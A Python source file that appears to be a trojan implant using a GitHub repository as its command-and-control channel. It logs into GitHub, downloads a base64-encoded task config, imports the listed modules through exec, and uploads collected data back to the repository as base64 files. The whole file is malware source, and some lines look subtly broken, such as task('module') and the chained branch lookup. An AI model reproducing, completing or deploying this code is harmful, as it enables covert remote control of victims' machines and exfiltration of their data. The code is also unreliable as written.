# -*- coding: utf-8 -*-

import json
import base64
import sys
import time
import imp
import random
import threading
import queue
import os

from github3 import login

hose_id = "abc"

hose_config = "%s.json" % hose_id
data_path = "data/%s/" % hose_id
hose_modules = []
configured = False
task_queue = queue.Queue()

def connect_to_github():
    gh = login(username="yourname", password="")
    repo = gh.repositories("yourname", "github")
    branch = repo.branch.commit.commit.tree.recurse()

    return gh, repo, branch

def get_file_content(filepath):

    gh, repo, branch = connect_to_github()
    tree = branch.commit.commit.tree.recurse()

    for filename in tree.tree:
        if filepath in filename.path:
            print("[*] Found file %s" % filepath)
            blob = repo.blob(filename._json_data['sha'])
            return blob.content
    
    return None

def get_hose_config():
    global configured
    config_json = get_file_content(hose_config)
    config = json.loads(base64.b64decode(config_json))
    configured = True

    for task in config:
        exec("import %s" % task('module'))

    return config

def store_module_result(data):
    gh, repo, branch = connect_to_github()
    remote_path = "data/%s/%d.data" % (hose_id, random.randint(1000, 100000))
    repo.create_file(remote_path, "Commit message", base64.b64encode(data))

    return
